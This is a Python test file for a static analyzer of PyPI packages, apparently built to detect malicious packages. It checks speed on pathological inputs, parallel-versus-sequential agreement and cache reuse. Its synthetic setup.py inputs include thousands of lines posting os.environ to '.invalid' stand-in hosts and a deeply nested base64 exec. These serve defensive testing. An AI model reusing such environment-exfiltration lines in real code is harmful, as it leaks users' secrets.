"""Static analysis stays fast on pathological inputs; parallel and sequential analysis agree; cache reuse."""
import os
import sys
import tempfile
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from pypi_rag.analysis import analyze_package  # noqa: E402
from pypi_rag.analysis.parallel import analyze_many  # noqa: E402
from pypi_rag.data.safe_io import files_from_texts  # noqa: E402
from pypi_rag.data.synthetic import make_synthetic  # noqa: E402
from pypi_rag.schema import Sample  # noqa: E402


def _pkg(sid, files):
    return Sample(sid, sid, "1", "unknown", files_from_texts(files))


def test_pathological_files_are_fast():
    long_line = "x = '" + "A" * 400000 + "'\n"                         # one huge minified line
    chain = "import os\nv0 = os.environ\n" + "".join(f"v{i} = v{i - 1} + v{i - 1}\n" for i in range(1, 400))
    nested = "import base64\nexec(" + "base64.b64decode(" * 60 + "'eA=='" + ")" * 60 + ")\n"
    many = "import requests, os\n" + "".join(f"requests.post('https://h{i}.invalid', data=os.environ)\n" for i in range(3000))
    for name, txt in (("long", long_line), ("chain", chain), ("nested", nested), ("many", many)):
        t0 = time.time()
        f = analyze_package(_pkg(name, {"setup.py": txt}))
        assert time.time() - t0 < 2.0, name
        assert f.n_files == 1


def test_parallel_equals_sequential_and_cache():
    samples = [s.public_view() for s in make_synthetic(24, 3)]
    seq = {s.sample_id: analyze_package(s) for s in samples}
    with tempfile.TemporaryDirectory() as d:
        par = analyze_many(samples, workers=2, cache_dir=d, log=None)
        for sid, f in seq.items():
            g = par[sid]
            assert sorted(f.behaviors()) == sorted(g.behaviors())
            assert len(f.flows) == len(g.flows) and len(f.calls) == len(g.calls)
        n_files = len(os.listdir(d))
        assert n_files == len(samples)
        msgs = []
        again = analyze_many(samples, workers=2, cache_dir=d, log=msgs.append)
        assert set(again) == set(par) and msgs == [f"[analysis] {len(samples)} packages from cache"]
